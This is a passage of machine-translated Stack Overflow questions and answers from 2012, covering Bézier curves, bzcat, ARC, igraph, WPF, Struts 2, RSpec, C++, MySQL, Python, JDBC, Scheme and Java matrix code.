如果使用三次贝塞尔曲线，则需要 4 个控制点。第一个必须与前一段的最后一个控制点相同；为了保持交界处的平滑度，第二个需要位于包含前一段最后 2 个控制点的线上的某个位置；第 4 个将是您希望这条曲线结束的地方；第三个可能可以自由选择。（您可能希望在第 1 点和第 4 点之间保持水平，以避免曲线“翻倍”的可能性。）

贝塞尔曲线还有 2 个其他属性可以简化您的实现：

*   曲线完全包含在由控制点定义的凸包内，因此很容易确保顶部曲线和底部曲线之间存在间隙。
*   您可以随时拆分一个贝塞尔曲线以生成 2 个子贝塞尔曲线。这对于光栅化/线性化很方便。

**编辑：**用“凸壳”替换“边界框”。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T21:20:58.217

确定隧道的宽度（它可能会随着距离而减小），然后在随机高度放置 2 个控制点，但要确保与前一对或点的垂直偏移足够小，以便直升机进行机动. 继续在相等距离处添加控制点：

```
 _  
_         _    _

     _         _
_         _ 
```

接下来，您需要找到中间点。我会使用单调三次插值，它保证所有中间点总是在控制点之间，永远不会更低或更高。这是我用 JavaScript 制作的演示：http: [//explored.tk/experiments/monotone/](http://explored.tk/experiments/monotone/)

UPD：或者您可以生成一条这样的曲线，然后围绕它对称地绘制隧道边界。

# linux - 如何查看压缩文件内容

> ID：12646843
> 
> 赞同：18
> 
> 时间：2012-09-28T20:18:33.880
> 
> 标签：linux

我有一个非常大的文件：`filename.bz2`，如何查看文件内容并执行一些命令，例如`awk`将一些数据提取到另一个文件中而不解压缩？我试图`head -50 filename.bz2`查看前 50 行，但它打印出垃圾而不是我应该从文件中查看的内容。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-09-28T20:22:43.790

您可以使用`bzcat`它的输出并将其输出到`awk`您使用的任何工具，但它与提取文件然后处理它本质上没有什么不同。

```
$ echo '1' > test
$ bzip2 test
$ bzcat test.bz2
1 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-09-28T20:26:06.627

你试过bzcat吗？

```
bzcat filename.bz2 | head -50 
```

阅读[更多](http://linux.about.com/library/cmd/blcmdl1_bzcat.htm)

# iphone - 在 ARC 下将 NSArray 设置为 nil

> ID：12646846
> 
> 赞同：1
> 
> 时间：2012-09-28T20:18:52.550
> 
> 标签：iphone, ios, cocoa, memory-management, automatic-ref-counting

我向我的所有`init`s 和`dealloc`s 添加了一些日志记录，以试图了解为什么我的启用 ARC 的项目随着运行时的继续消耗越来越多的内存。我发现一个视图控制器负责。初始化时的主要职责是创建一个并用对象`NSMutableArray`填充它。`NSNull`在执行期间，它将这些空对象换成更有意义的对象，反之亦然 - 一个基本的延迟加载设置。

当这个视图控制器被弹出时，当时的任何非空视图`NSMutableArray`都不会被释放。结果，视图控制器本身也没有被释放。

我可以通过清空`NSMutableArray`或将其设置为零来解决此问题。

是什么让这变得有必要？如果我创建了一个数组，即使在 ARC 下，将它设置为 nil 是否总是我的责任？还是必须有其他东西保留数组中的一个对象，并阻止它自动释放？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T21:52:05.187

假设`NSMutableArray`是一个实例变量，它应该在视图控制器被释放时被释放。如果你的控制器在唯一有对象`dealloc`时被调用，但是当你用“有意义的”内容填充你的数组时它没有被释放，这意味着你无疑有一个[强大的引用循环](http://developer.apple.com/library/ios/documentation/cocoa/conceptual/ProgrammingWithObjectiveC/EncapsulatingData/EncapsulatingData.html#//apple_ref/doc/uid/TP40011210-CH5-SW22)，即必须有一些对视图控制器的引用，本身，在.`NSMutableArray``NSNull``NSMutableArray`

# r - 更改 igraph 图中子图的颜色

> ID：12646847
> 
> 赞同：3
> 
> 时间：2012-09-28T20:18:57.513
> 
> 标签：r, igraph

我有以下代码来绘制图形的最小生成树

```
## g is an igraph graph
mst = minimum.spanning.tree(g)
E(g)$color <- "SkyBlue2"

## how to I make mst a different color
E(g)[E(mst)]$color = "red"  ### <---- I WANT TO DO ESSENTIALLY THIS

plot(g,  edge.label=E(g)$weight) 
```

也就是说，对于一个简单的图表，我找到了 mst。我想将 mst 更改为红色并将 mst 绘制为主图的一部分。为此，我想选择`g`也在`mst`. 我该怎么做呢？

* * *

更新：

更一般地说，我有一个图`g0`，它是 的 mst `g`，它有`n`顶点。它的构造如下

```
## implementing the Dijkstra-Prim algorithm
v0 = sample(1:n, 1)
g0 = graph.empty(n=n, directed=FALSE)
weight.g0 = 0
while(length(setdiff(1:n, v0) > 0)) {
  ## chose the shortest edge in the cut set of g

  ## to find the cut, figure out the set of edges where vertex is
  ## in v0 and the other is not
  cutset = E(g)[ v0 %->% setdiff(1:n, v0)]

  ## find the lightest weight edge
  cutweights = E(g)$weight[cutset]
  lightest_edge_idx = which(cutweights == min(cutweights))[1]
  weight.g0 = weight.g0 + min(cutweights)

  ## get the vertices of the lightest weight edge, add to path
  lightest_edge = cutset[as.numeric(cutset)[lightest_edge_idx]]
  vertices = get.edges(g, as.numeric(lightest_edge))

  g0 <- add.edges(g0, vertices, weight=min(cutweights))

  ## now that we have the vertices, add the one that is not in the
  ## graph already
  for(vtx in vertices) {
    if(!(vtx %in% v0)) {
      v0 = c(vtx, v0)
    }
  }

} 
```

我知道我可能没有使用 igraph 的很多有用功能，但我确实`g0`在这个循环结束时成为了一个 mst。鉴于此，我有

```
E(g0)
Edge sequence:

[1]   8 --  1
[2]   2 --  1
[3]   9 --  8
[4]   9 --  5
[5]   3 --  2
[6]   4 --  3
[7]   7 --  3
[8]  11 --  4
[9]   7 --  6
[10] 11 -- 10
> E(g)
Edge sequence:

[1]   2 --  1
[2]   5 --  1
[3]   8 --  1
[4]   3 --  2
[5]   5 --  2
[6]   6 --  2
[7]   4 --  3
[8]   6 --  3
[9]   7 --  3
[10]  7 --  4
[11] 11 --  4
[12]  6 --  5
[13]  8 --  5
[14]  9 --  5
[15]  7 --  6
[16]  9 --  6
[17] 10 --  6
[18] 10 --  7
[19] 11 --  7
[20]  9 --  8
[21] 10 --  9
[22] 11 -- 10 
```

我的问题是，如何将属性分配给 E(g) 中也在 E(g0) 中的边？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T22:49:46.593

这实际上很容易，因为`minimum.spanning.tree()`保留了边缘属性。所以你只需要分配一个边缘 id 属性，你就会看到哪些边缘是红色的。它是这样的：

```
# Some test data, no edge weights, quite boring
g <- erdos.renyi.game(20,2/20)
g
# IGRAPH U--- 20 24 -- Erdos renyi (gnp) graph
# + attr: name (g/c), type (g/c), loops (g/l), p (g/n)

E(g)$id <- seq_len(ecount(g))
mst <- minimum.spanning.tree(g)
mst
# IGRAPH U--- 20 18 -- Erdos renyi (gnp) graph
# + attr: name (g/c), type (g/c), loops (g/l), p (g/n), id (e/n)
E(mst)$id
# [1]  1  2  3  6  7  8  9 10 11 12 13 16 18 19 20 22 23 24

E(g)$color <- "black"
E(g)$color[E(mst)$id] <- "red"
plot(g) 
```

![在此处输入图像描述](../Images/4afaae181a1ffb555fc9b3ac7d4ac940.png)

# wpf - “DataContext = new ...”是否实例化了可访问对象？

> ID：12646854
> 
> 赞同：0
> 
> 时间：2012-09-28T20:19:25.173
> 
> 标签：wpf

我一直在阅读 WPF 数据绑定，寻找简单的例子来说明如何绑定，比如说，一个字符串，比如说，一个 TextBlock，所以当字符串的值发生变化时，TextBlock..

我发现的许多网络示例看起来像这样。. .

```
 public partial class Window1 : Window
 {
     public Window1()
     {
         InitializeComponent();
         this.DataContext = new Person { FirstName="Rowan" };
     }
 }

 public class Person
 {
     public String FirstName { get; set; }
     public String LastName { get; set; }
 } 
```

...在“新”语句中分配类的属性。那么如何在运行时稍后将 FirstName 设置为其他值？做一个

```
this.DataContext = new Person { FirstName="Rowan" }; 
```

实例化一个 Person 类型的对象，其属性和方法可以像任何其他对象一样被访问，方式如下：

```
Person a_person = new Person { FirstName="Rowan" }; 
```

...将？如果是这样，那么我如何访问它？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:22:14.610

我相信你想要这样的东西：

```
 public partial class Window1 : Window
 {
     Person GoodPerson{get;set;}
     public Window1()
     {
         InitializeComponent();
         GoodPerson = new Person { FirstName="Rowan" };
         this.DataContext = GoodPerson;
         GoodPerson.FirstName="Rand";
     }
 } 
```

尽管要通知您的 TextBlock 属性更改，您的 Person 类将需要实现`INotifyPropertyChanged`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-29T00:30:05.827

您可以通过以下方式访问用作 DataContext 的实例

```
Person p = (Person)DataContext; 
```

# redirect - Struts 2拦截器重定向JSP页面

> ID：12646863
> 
> 赞同：3
> 
> 时间：2012-09-28T20:20:06.897
> 
> 标签：redirect, struts2, interceptor, interceptorstack

使用 Struts 2，我有这个拦截器：

```
public class AccessInterceptor extends AbstractInterceptor {
    @Override
    public String intercept(ActionInvocation ai) throws Exception {
        ActionContext actionContext = ai.getInvocationContext();
        Map<String, Object> session = actionContext.getSession();
        Boolean logged = (Boolean) session.get("logged");
        if(logged == null) {
          session.put("logged", false);
          logged = false;
        }
        if (!logged) {
            // If exception is here, it IS thrown, so I am sure "login" is returned on /homepage
            return "login";
        }   
        return ai.invoke();
    }
} 
```

这`struts.xml`：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE struts PUBLIC
    "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
    "http://struts.apache.org/dtds/struts-2.0.dtd">

<struts>
<constant name="struts.devMode" value="true" />
<package name="loginInterceptor" namespace="/" extends="struts-default">
    <interceptors> 
        <interceptor name="access"
         class="logininterceptor.interceptors.AccessInterceptor"/>
        <interceptor-stack name="appDefault"> 
            <interceptor-ref name="access" />
            <interceptor-ref name="defaultStack" /> 
        </interceptor-stack> 
    </interceptors> 
    <default-interceptor-ref name="appDefault" />       
    <global-results>
        <result name="login">/WEB-INF/content/login.jsp</result>
    </global-results>
</package>
</struts> 
```

我也有`/WEB-INF/content/homepage.jsp`JSP 和`/WEB-INF/content/login.jsp`和`mypackage.LoginAction.java`类。主页没有动作类

问题是，当我转到该`/homepage`页面时，它没有被重定向到`login.jsp`并且我看到了`homepage.jsp`内容。怎么了？

PS：我使用 struts2-convention-plugin

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-02T23:37:51.520

发生这种情况是因为约定插件使用“约定默认”包，它不知道您的拦截器或拦截器堆栈。

如果您可以创建一个扩展约定的包，默认执行您的拦截器堆栈所做的事情（定义拦截器，拦截器堆栈并定义默认结果类型），然后使约定插件将该堆栈应用为所有操作的默认值不会那太好了？你可以。

在`<struts>`标记之后定义一个常量，如下所示：

```
<constant name="struts.convention.default.parent.package" value="loginInterceptor"/> 
```

另一个建议是使用 struts.xml 来覆盖约定，这很好，但有点冗长。

另一种选择是使用父包注释，这在您需要覆盖默认行为时很好，但正如您指出的那样，您希望*这*是默认行为，因此您应该保留注释以覆盖它，而不是实现它。

将来可能值得浏览以下 struts2 约定插件常量列表：http: [//struts.apache.org/2.1.8/docs/convention-plugin.html#ConventionPlugin-Overwritingpluginclasses](http://struts.apache.org/2.1.8/docs/convention-plugin.html#ConventionPlugin-Overwritingpluginclasses)

PS：只是命名偏好，但我会调用你的包 login-package 而不是 loginInterceptor ......没什么大不了的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T22:59:26.113

如果您想在每次有人访问时强制执行拦截器`homepage.jsp`，那么正确的做法是放置一个返回 jsp 的操作。例如：

```
<struts>
...
<package name="loginInterceptor" namespace="/" extends="struts-default">
    <interceptors> 
        ...
    </interceptors> 
    <default-interceptor-ref name="appDefault" />       
    <global-results>
       ...
    </global-results>
    <action name="homepage">
        <result>/WEB-INF/content/homepage.jsp</result>
    </action>
</package>
</struts> 
```

之后，当用户尝试访问时`http://.../homepage.action`，拦截器将被执行，如果用户未登录，将被重定向到登录页面。

# c# - 使用 XamlReader.Load 因我实施的 TriggerAction 失败，但使用内置触发器成功

> ID：12646865
> 
> 赞同：0
> 
> 时间：2012-09-28T20:20:16.633
> 
> 标签：c#, silverlight, windows-phone-7, xaml, windows-phone-7.1

我的应用程序动态加载 XAML - XAML 可以来自我的服务器，因此我不能只实例化控件。

我为此使用 XamlReader.Load()，并且已经有一段时间了。

我现在遇到了一个奇怪的问题 - 当我尝试反序列化包含对我的触发器的引用的 XAML 时，读者会抛出一个异常，说它无法解析 xaml：

> System.Windows.Markup.XamlParseException 发生 Message=Unknown parser error: Scanner 2147500037\. [Line: 5 Position: 10]
> LineNumber=5 LinePosition=10 StackTrace: at MS.Internal.XcpImports.CreateFromXaml(String xamlString, Boolean createNamescope, Boolean requireDefaultNamespace , Boolean allowEventHandlers, Boolean expandTemplatesDuringParse, Boolean trimDeclaredEncoding) at System.Windows.Markup.XamlReader.Load(String xaml) at LoadXamlFail.MainPage.myTrigger_Clicked(Object sender, RoutedEventArgs e)

现在，当我尝试反序列化包含对 Blend 触发器的引用的 XAML 时，一切正常。下面是包含 Blend 触发器的 XAML：

```
<Grid x:Name="LayoutRoot">
    <i:Interaction.Triggers>
        <i:EventTrigger EventName="Tap">
            <eim:PlaySoundAction/>
        </i:EventTrigger>
    </i:Interaction.Triggers>
</Grid> 
```

这是包含我的触发器的 XAML：

```
<Grid x:Name="LayoutRoot">
    <i:Interaction.Triggers>
        <i:EventTrigger EventName="Tap">
            <local:MyTrigger/>
        </i:EventTrigger>
    </i:Interaction.Triggers>
</Grid> 
```

我的触发器尽可能简单——它基本上不做任何事情：

```
public class MyTrigger  : TriggerAction<FrameworkElement>
{
    public MyTrigger()
    {
    }

    protected override void Invoke(object parameter)
    {
    }
} 
```

加载 XAML 的代码（两种情况下的代码相同 - 一种有效，另一种无效）如下所示：

```
using (var stream = App.GetResourceStream(new System.Uri("/LoadXamlFail;component/OtherTriggerControl.xaml", UriKind.Relative)).Stream)
using (var reader = new StreamReader(stream))
{
    var xaml = reader.ReadToEnd();
    xaml = FixXaml(xaml);
    XamlReader.Load(xaml);
} 
```

最后，通过删除支持 XAML 的控件来加载 XAML 工作正常。

有谁知道可能是什么原因造成的，或者如何解决它？

（如果有人想看一个工作示例，请在[此处](https://www.box.com/s/jhmqzhdtrn7uxhqurk2g)下载代码）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:41:25.143

好的，想通了（想通了，我的意思是另一个论坛上的某个人给了我答案）。

本质上，当使用 XamlReader 时，您不能依赖常规 XAML 的行为，其中位于程序集中的命名空间不需要使用 assembly= 元素进行修饰。

[http://socialeboladev.wordpress.com/2012/09/30/xamlreader-and-xamlparseexception-occurred-messageunknown-parser-error-scanner-2147500037/](http://socialeboladev.wordpress.com/2012/09/30/xamlreader-and-xamlparseexception-occurred-messageunknown-parser-error-scanner-2147500037/)

# struts2 - 在 Websphere 的 struts2 中重新加载资源包

> ID：12646868
> 
> 赞同：0
> 
> 时间：2012-09-28T20:20:28.327
> 
> 标签：struts2, websphere, resourcebundle

我的 struts.properties 中有 struts.devMode=true。这将导致资源包每次重新加载。但是每次尝试重新加载时都会在下面抛出异常。我的应用程序在 websphere 7 上运行。任何帮助都会得到帮助。 `com.opensymphony.xwork2.util.logging.commons.CommonsLogger error Could not reload resource bundles java.lang.NoSuchFieldException: cacheList`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T22:44:20.327

您不能在 devMode 和 Websphere 中使用 Struts 2。Internet 上的信息不多（[法语](http://www.alcibiade.org/?p=86)），但我只能以有限的法语知识理解，您必须将服务器设置为生产设置。

我的意思是你`struts.xml`必须是这样才能让 Struts2 在 Websphere 上工作：

```
<struts>
   <constant name="struts.devMode" value="false" />
   <constant name="struts.i18n.reload" value="false" />
   <constant name="struts.configuration.xml.reload" value="false" />
   ...
</struts> 
```

为什么会发生这种情况的原因不是很清楚。该博客解释说，这可能是针对 IBM 的不同 JVM 实现，并且可能在没有私有字段*cacheList*的 ResourceBundle 类的实现上有所不同，然后在重新加载 i18n 标签时引发错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-24T04:47:53.297

以下解决方案在 Tomcat 7 和 WebSphere Application Server 7 中为我工作。

```
LocalizedTextUtil.reset();
ResourceBundle.clearCache(LocalizedTextUtil.class.getClassLoader()); 
```

这将清除 ResourceBundle 缓存。

*`devMode`并且`i18n.reload`必须是`false`.

问候，

费利佩

# ruby-on-rails - 优化 Rspec 测试以避免重复复杂的设置过程

> ID：12646871
> 
> 赞同：0
> 
> 时间：2012-09-28T20:20:51.600
> 
> 标签：ruby-on-rails, rspec

所以这是我的问题：

我正在为我的 Rails 模型编写单元测试，并且我有一整套示例，每个示例都需要相同的设置才能运行。如果我没记错的话，为多个 RSpec 测试设置相同方式的常用方法是使用 before(:each) 块，如下所示：

```
describe Model do
  before(:each) do
    # Complex setup
  end
  # Examples
end 
```

不幸的是，需要此设置的示例集开始变得相当大，并且为每个测试完成这个复杂的设置过程需要很长时间。我试过这样做：

```
describe Model do
  before(:all) do
    # Complex setup
  end
  # Examples
end 
```

但是这种方法在我完成后不会回滚我的设置，这会导致以后的测试出现问题。我真正想要的是做这样的事情：

```
describe Model do
  around(:all) do |examples|
    transaction do
      # Complex setup
      examples.run
      raise ActiveRecord::Rollback
    end
  end
  # Examples
end 
```

然而，RSpec 目前不支持 around(:all) 钩子。有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-29T03:49:51.187

最简单的方法就是`after(:all)`在测试后使用块进行清理。

# c++ - 编译器似乎在成员之前拒绝类标识符初始化

> ID：12646875
> 
> 赞同：0
> 
> 时间：2012-09-28T20:21:09.433
> 
> 标签：c++, compilation, mingw

请理解，我在写这篇文章时发烧了，此外，自从我使用 C++ 或相关的类以来，已经是几年前的事了。

我的问题在于 g++ 编译器拒绝我调用类标识符（+ 成员说明符）以及该类的实际成员。

这就是我的意思：

```
class window{
public:
int borderX, borderY, menu_item;
}; 
```

如果我选择调用这些成员之一（boderX、borderY、menu_item），如下所示：

```
window.borderX = [some value here]; 
```

我得到一个错误的回报：

> 错误：“。”之前的预期不合格 ID 令牌

当我查看 cplusplus 的网站时，此代码在语法上并不错误。然而，它拒绝编译？

这是来自 cplusplus 网站的示例：

```
class CRectangle {
    int width, height;
  public:
    void set_values (int, int);
    int area (void) {return (width * height);}
};
CRectangle rect;
  rect.set_values (3,4); 
```

这段代码也不编译！

它返回此错误：

> 错误：“rect”没有命名类型

我不明白为什么它会返回这些错误。Window IS 用作标识符 - 或其类型。其次，它甚至不会从教授 C++ 使用的网站本身编译代码。

我正在等待在这些问题上得到纠正。另外，为了记录，我正在使用MingW。Code::Blocks 和 Netbeans 都产生相同的结果（是的，我知道它们是 IDE，而不是编译器。）

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T20:27:26.420

'window' 定义了类，但您需要创建该类的实例才能使用它的非静态成员和方法。

您可以在堆栈上创建一个实例，

```
window w;
w.borderX = [some value here]; 
```

或者在堆上创建一个，

```
window *w = new window();
w->borderX = [some value here]; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T20:30:27.700

尝试这个：

首先你声明类。在window.h中

```
#include <iostream> // for cout and endl

class Window{
public:
    int borderX, borderY, menu_item;
}; 
```

在您启动程序的主文件中：

```
#include <window.h>
int main() {
    // 1\. make an instance of Window
    Window w;         

    // 2\. set some values
    w.borderX = 12;   
    w.borderY = 8;
    w.menu_item = 7;

    // 3\. print the values
    std::cout << "X: "  << w.borderX 
              << " Y: " << w.borderY 
              << " menu item: " << w.menu_item << std::endl;

    //OR with a pointer
    // 1\. create a new pointer that points to 
    //    an instance of Window (which is also create in the process)
    Window pw = new Window(); 

    // 3\. set some values
    pw->borderX = 9;           
    pw->borderY = 12;
    pw->menu_item = 18;

    // 3\. print the values
    std::cout << "X: "<< pw->borderX << " Y: " << pw->borderY 
              << " menu item: " << pw->menu_item << std::endl;

    // 4\. Rule: for every *new* (new Window()) there is 1 delete
    //    So every pointer should be deleted somewhere 1 time to avoid memory leaks
    delete pw; 

    return 0;
} 
```

我希望你尽快好起来。发烧不好笑。

# javascript - Java 脚本找不到 div 类？

> ID：12646880
> 
> 赞同：1
> 
> 时间：2012-09-28T20:21:24.057
> 
> 标签：javascript, objective-c, ios, getelementsbyclassname

```
NSString *htmlDataString = [newView stringByEvaluatingJavaScriptFromString: @"document.documentElement.getElementsByClassName('field-item even')[0]"]; 
```

名为 newView 的 webview 正在正确设置，因为它适用于其他 javascript 位，因此它必须符合我的语法。

div 类如下所示：

```
<div class="field-item even" property="content:encoded"> 
```

在中断指向 htmldatastring 并进入它之后，它只有以下值：`@""`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T20:23:35.980

您正在按 id 选择元素，但您在标记中将其作为类提供。你应该做：

```
<div class="field-item even" property="content:encoded"> 
```

然后在 objc 中引用为：

```
NSString *htmlDataString = [newView stringByEvaluatingJavaScriptFromString: @"document.documentElement.getElementById('someId')[0]"]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T20:26:06.310

您正在使用`getElementById`，但如果您指的是一个类，那么您必须使用`getElementsByClassName`

```
document.documentElement.getElementsByClassName('field-item even')[0] 
```

# mysql - 带有负小数的 MySQL 和

> ID：12646881
> 
> 赞同：-1
> 
> 时间：2012-09-28T20:21:26.140
> 
> 标签：mysql, sum, negative-number, decimal

我的表中有一个 qty 列，我正在尝试对这些值求和。字段类型是 varchar(20)。下面的数量之和应该正好加起来为 0。它是负小数和正小数的混合。

[展品A](https://www.evernote.com/shard/s1/sh/7ad76d81-e10d-4783-93f3-84f4c63a054c/7fa5de1f697f6298bbe571066b833235)（截图）

当我执行下面的求和时，我得到一吨小数而不是 0。我假设这是一个数据类型问题。解决此问题的最佳方法是什么？

[展品 B](https://www.evernote.com/shard/s1/sh/41fb8878-55f3-4d8a-958d-c10a5b306e4d/9468e18a2c10b2c34f7428ed015f44be)（截图）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:34:00.147

您不应该将数字数据存储为字符串，但如果这样做，则需要`cast()`对其应用`SUM()`聚合：

```
SELECT SUM(CAST(yourcolumn AS DECIMAL(10, 2))) 
FROM yourtable 
```

所以您的查询将是：

```
select sum(cast(qty as DECIMAL(10, 2)))
from inventory i
where i.refDocNum = 485
  and i.refApp = 'WO'
  and i.type in (20, 21) 
```

# compiler-construction - OpenCVSharp 和 Unity3d：内部编译器错误

> ID：12646882
> 
> 赞同：1
> 
> 时间：2012-09-28T20:21:38.290
> 
> 标签：compiler-construction, unity3d, internal, opencvsharp

我想在 Unity3D 中使用网络摄像头和 Blob 检测。我在某处读到 OpenCVSharp 可能是选项，但我在添加 dll 时遇到问题。

> 内部编译器错误。有关更多信息，请参阅控制台日志。输出为：警告 CS1685：预定义类型“System.Runtime.CompilerServices.ExtensionAttribute”不明确。使用来自 `System.Core, Version=2.0.5.0, Culture=neutral, PublicKeyToken=7cec85d7bea7798e' E:\Program\Unity\Editor\Data\Mono\lib\mono\unity\System.Core.dll 的定义（位置与先前警告相关的符号）C:\Users...\Unity Projects\Game\Assets\Plugins\OpenCVSharp\OpenCvSharp.CPlusPlus.dll（与先前警告相关的符号位置）

有没有办法在不将 OpenCVSharp 带出 Unity3D 的情况下修复此错误？

# python - python二十一点游戏，似乎忽略了'if'语句

> ID：12646883
> 
> 赞同：1
> 
> 时间：2012-09-28T20:21:39.367
> 
> 标签：python, if-statement, python-2.7

我一直在尝试用python制作一个简单的二十一点游戏，我似乎被卡住了，我的代码如下：

```
from random import choice

def deck():
    cards = range(1, 12)
    return choice(cards)

def diack():
    card1= deck()
    card2 = deck()
    hand = card1 + card2
    print hand
    if hand < 21:
         print raw_input("Would you like to hit or stand?")
         if "hit":
             return hand + deck()
         elif "stand": 
             return hand 
```

当我运行时，它似乎对“命中”有效，但是当我输入“站立”时，它似乎也“命中”。正如您现在可能知道的那样，我对编程非常陌生。你们能否帮助我指出如何让我的游戏正常运行的正确方向（我想尽可能多地使用我的代码）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T20:24:47.003

`if "hit"`只是测试字符串是否`"hit"`存在，它确实存在。因此，该`elif`语句永远不会执行。

您需要在变量中捕获用户输入并对其进行测试：

```
choice = raw_input("Would you like to hit or stand?")
print choice
if choice == "hit":
    return hand + deck()
elif choice == "stand": 
    return hand 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-28T20:24:18.787

假设你得到正确的缩进：

```
print raw_input("Would you like to hit or stand?")
if "hit":
    return hand + deck()
elif "stand": 
    return hand 
```

您`if`只是在检查字符串是否`"hit"`为真。所有非空字符串都是真的，并且`"hit"`是非空的，所以这总是会成功的。

你想要的是这样的：

```
cmd = raw_input("Would you like to hit or stand?")
if cmd == "hit":
    return hand + deck()
elif cmd == "stand": 
    return hand 
```

现在您正在检查的结果是否是您想要`raw_input`的字符串。`"hit"`

# java - JDBC 在同一台服务器上跨两个 MySQL 数据库连接？

> ID：12646884
> 
> 赞同：3
> 
> 时间：2012-09-28T20:21:45.060
> 
> 标签：java, mysql, jdbc

基本上我需要通过 jdbc 运行以下查询。两个数据库都是 MySQL 并且在同一台服务器上。

```
SELECT * FROM DB1.ACCOUNT a
JOIN DB2.ITEM i ON a.AccountID = i.AccountID 
```

我的 jdbc 连接是这样设置的：

```
Class.forName("com.mysql.jdbc.Driver").newInstance();
DB1 = DriverManager.getConnection("jdbc:mysql://serverloc.com:3300/DB1", "username", "password");
DB2 = DriverManager.getConnection("jdbc:mysql://serverloc.com:3300/DB2", "username", "password"); 
```

这是我遇到问题的地方。我现在可以针对 DB1 或 DB2 创建一个语句，但是我找不到针对这两个数据库进行 JOIN 的方法。我已经尝试针对其中一个数据库（如下）运行我的查询，但它返回 null。

```
Statement statement = DB1.createStatement();
ResultSet resultSet = statement.executeQuery(" QUERY HERE "); 
```

我已经看到您可以使用 UnityJDBC 跨数据库运行 JOIN 查询，但我正在寻找免费/开源选项。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T20:22:54.673

1) 是的，您可以在 mySQL 中的两个不同数据库之间“加入”。

2）不，你*不需要*两个不同的连接来做到这一点。

例如：

*   [http://www.webhostingtalk.com/showthread.php?t=476982](http://www.webhostingtalk.com/showthread.php?t=476982)

    `p2.upc_code FROM db1.products p1 LEFT OUTER JOIN db2.products p2 ON p1.prod_id=p2.prod_id";`

# scheme - 方案将两个列表合并为一个

> ID：12646888
> 
> 赞同：4
> 
> 时间：2012-09-28T20:21:59.510
> 
> 标签：scheme

如何设计一个将两个列表合并为一个列表的功能。第一个列表的第一个元素将是新列表的第一个元素，第二个列表的第一个元素将是新列表的第二个元素 (a,b,c,d,e,f) (g,h, i) 将是 (a,g,b,h,c,i,d,e,f,)

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-09-28T20:32:16.090

这是一个纯粹的函数式和递归实现`R6RS`

```
(define (merge l1 l2)
      (if (null? l1) l2
          (if (null? l2) l1
              (cons (car l1) (cons (car l2) (merge (cdr l1) (cdr l2))))))) 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-28T20:33:06.943

您尝试实施的过程称为`interleave`或`merge`。因为这看起来像家庭作业，所以我不能给你一个直接的答案，而是会为你指出正确的方向；填空：

```
(define (interleave lst1 lst2)
  (cond ((null? lst1)     ; If the first list is empty
         <???>)           ; ... return the second list.
        ((null? lst2)     ; If the second list is empty
         <???>)           ; ... return the first list.
        (else             ; If both lists are non-empty
         (cons (car lst1) ; ... cons the first element of the first list
               <???>))))  ; ... make a recursively call, advancing over the first
                          ; ... list, inverting the order used to pass the lists. 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-04-29T20:43:18.233

无需检查两个列表：这是一个简单的版本：

```
 (define (interleave lx lz)
  (cond
    [(empty? lx) lz]
    [else (cons (first lx)(interleave lz (rest lx)))]))

(check-expect(interleave '() '())'())
(check-expect(interleave '(X X X X X X) '(O O O O O))
             (list 'X 'O 'X 'O 'X 'O 'X 'O 'X 'O 'X))
(check-expect(interleave '(1 2 3) '(a b c d e f))
             (list 1 'a 2 'b 3 'c 'd 'e 'f)) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-10-18T18:55:59.037

这可以使用一个简单的条件来完成。

```
(define (merge a b)
  (cond ((null? a) b)
        ((null? b) a)
        (else (cons (car a) (merge b (cdr a))))
        )) 
```

# java - 为什么我的矩阵乘法器不起作用？

> ID：12646889
> 
> 赞同：0
> 
> 时间：2012-09-28T20:22:06.783
> 
> 标签：java, matrix

```
public static double[][] multiplyMatrix(double[][] matrix1, double[][] matrix2) {
        // As both arrays are square and the same size, the row size represents the row size and column size for both matrices
        int dimension = matrix1.length;

        double[][] matrix3 = new double[dimension][dimension];

        for (int i = 0; i < dimension-1; i++) {
            for (int j = 0; j < dimension-1; j++) {
                for (int k = 0; k < dimension-1; j++) {
                    matrix3[i][j] += matrix1[i][k] * matrix2[k][j];
                }
            }
        }

        return matrix3;
    } 
```

这非常令人沮丧。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T20:25:04.060

看起来 k 一直等于零。您在两个循环中都增加了 j 。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-28T20:25:26.120

您的 for 循环需要再进行一次迭代。

```
for (int i = 0; i < dimension-1; i++) 
```

应该

```
for (int i = 0; i < dimension; i++) 
```

也以同样的方式更新你的`j`和`k`循环（和你的`k`循环增量`j`，这看起来就像一个复制/粘贴错误）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T20:28:00.407

此代码生成一个`ArrayIndexOutOfBoundsException`. 您`j`在`k`'``for`循环中递增。更好地使用：

```
for (int i = 0; i < dimension; i++) {
    for (int j = 0; j < dimension; j++) {
        for (int k = 0; k < dimension; k++) {
